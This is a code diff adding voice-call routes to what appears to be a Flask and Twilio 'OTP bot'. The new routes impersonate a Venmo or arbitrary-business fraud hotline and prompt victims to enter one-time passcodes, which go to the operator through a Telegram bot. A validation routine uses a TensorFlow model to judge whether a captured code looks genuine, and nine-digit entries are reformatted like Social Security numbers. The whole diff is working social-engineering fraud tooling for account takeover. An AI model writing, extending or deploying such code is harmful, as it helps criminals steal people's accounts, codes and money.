@@ -51,6 +51,76 @@ def voicepaypal():
         resp.append(gather)
         print('Call in progress')
     return str(resp)
+@app.route("/voice/venmo", methods=['GET', 'POST'])
+def voicevenmo():
+    resp = VoiceResponse()
+    name = request.args.get('name')
+    chanid = request.args.get('chanid')
+    print(request.values)
+    if 'AnsweredBy' in request.values:
+        answered_by = request.values['AnsweredBy']
+        if answered_by == 'machine_start':
+            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "🤖 Call answered by machine"})
+
+            return str(resp)
+    if 'Digits' in request.values:
+        choice = request.values['Digits']
+        if choice == '1':
+            gather = Gather(num_digits=6, action='/validate?chanid=' + chanid, timeout=8)
+            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "#️⃣ One pressed Send OTP Now!"})
+            gather.say('We have sent you a 6 digit code. Please enter this code to block this request.', volume=2, voice="alice")
+            resp.append(gather)
+            print('Code sent')
+            return str(resp)
+        else:
+            resp.say("Sorry, I don't understand that choice.")
+    else:
+        if 'AnsweredBy' in request.values:
+            answered_by = request.values['AnsweredBy']
+            if answered_by == 'human':
+                requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "👤 Call answered by Human"})
+        gather = Gather(num_digits=1, action='/voice/venmo?chanid=' + chanid, timeout=6)
+        requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": "📲 Call Answered"})
+        gather.say(f'Hello {name}, this is the Venmo fraud prevention hotline. We are calling to inform you about a request to change the number on this account. If this was not you press one. If this was you, you can hang up and have a great rest of your day', volume=2, voice="alice")
+        resp.append(gather)
+        print('Call in progress')
+    return str(resp)
+@app.route("/voice/otp", methods=['GET', 'POST'])
+def voiceotp():
+    resp = VoiceResponse()
+    name = request.args.get('name')
+    chanid = request.args.get('chanid')
+    bname = request.args.get('bisname')
+    dgts = request.args.get('dgt')
+    print(request.values)
+    if 'AnsweredBy' in request.values:
+        answered_by = request.values['AnsweredBy']
+        if answered_by == 'machine_start':
+            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "🤖 Call answered by machine"})
+
+            return str(resp)
+    if 'Digits' in request.values:
+        choice = request.values['Digits']
+        if choice == '1':
+            gather = Gather(num_digits=int(dgts), action='/validate?chanid=' + chanid, timeout=8)
+            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "#️⃣ One pressed Send OTP Now!"})
+            gather.say(f'We have sent you a {dgts} digit code. Please enter this code to block this request.', volume=2, voice="alice")
+            resp.append(gather)
+            print('Code sent')
+            return str(resp)
+        else:
+            resp.say("Sorry, I don't understand that choice.")
+    else:
+        if 'AnsweredBy' in request.values:
+            answered_by = request.values['AnsweredBy']
+            if answered_by == 'human':
+                requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id": chanid , "text": "👤 Call answered by Human"})
+        gather = Gather(num_digits=1, action='/voice/otp?chanid=' + chanid+f'&dgt={dgts}', timeout=6)
+        requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": "📲 Call Answered"})
+        gather.say(f'Hello {name}, this is the {bname} fraud prevention hotline. We are calling to inform you about a request to change the number on this account. If this was not you press one. If this was you, you can hang up and have a great rest of your day', volume=2, voice="alice")
+        resp.append(gather)
+        print('Call in progress')
+    return str(resp)
 @app.route('/call/status', methods=['POST','GET'])
 def status():
     chanid = request.args.get('chanid')
@@ -222,21 +292,22 @@ def validate():
     if 'Digits' in request.values:
         digits = request.values['Digits']
         resp.say("Thank You. We will block this request.", volume=2, voice="alice")
-        x = np.array([int(digit) for digit in digits])
-        x_onehot = np.zeros((1, 6, 10))
-        for j in range(6):
-            digit = int(x[j])
-            x_onehot[0, j, digit] = 1
-        print(x_onehot)
-        prediction = model.predict(x_onehot)
-        if prediction[0, 0] > 0.5:
-            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": f"⚠️this code is likely human made [🤖Tensorflow AI Flag]"})
-            print(prediction)
-            print("This code was likely made by a human.")
-            print(prediction)
-        else:
-            requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": f"✅this code is likely real [🤖Tensorflow AI Flag]"})
-            print(prediction)
+        if digits == 6:
+            x = np.array([int(digit) for digit in digits])
+            x_onehot = np.zeros((1, 6, 10))
+            for j in range(6):
+                digit = int(x[j])
+                x_onehot[0, j, digit] = 1
+            print(x_onehot)
+            prediction = model.predict(x_onehot)
+            if prediction[0, 0] > 0.5:
+                requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": f"⚠️this code is likely human made [🤖Tensorflow AI Flag]"})
+                print(prediction)
+                print("This code was likely made by a human.")
+                print(prediction)
+            else:
+                requests.post(f"https://api.telegram.org/bot{botid}/sendMessage", data={"chat_id":  chanid , "text": f"✅this code is likely real [🤖Tensorflow AI Flag]"})
+                print(prediction)
         if re.fullmatch(r"\d{9}", digits):
            digits = "{}-{}-{}".format(digits[:3], digits[3:5], digits[5:])
         for code in codes:
